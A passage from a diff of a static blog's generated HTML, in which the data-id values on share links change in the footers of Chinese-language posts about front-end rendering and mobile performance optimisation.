+      <a data-url="http://hijimo.github.io/2018/03/31/前端优化-渲染优化二-管道-javascript/" data-id="cjrcvauzp002njb3gtxowivj7" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/javascript/">javascript</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/前端优化/">前端优化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渲染/">渲染</a></li></ul>
@@ -655,7 +613,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://hijimo.github.io/2018/03/22/前端优化-移动设备的性能分析/" data-id="cjrcv2r2x002win3gibgawej1" class="article-share-link">Teilen</a>
+      <a data-url="http://hijimo.github.io/2018/03/22/前端优化-移动设备的性能分析/" data-id="cjrcvauzv002yjb3gxlf8feon" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/分析/">分析</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/前端优化/">前端优化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/性能/">性能</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/移动/">移动</a></li></ul>
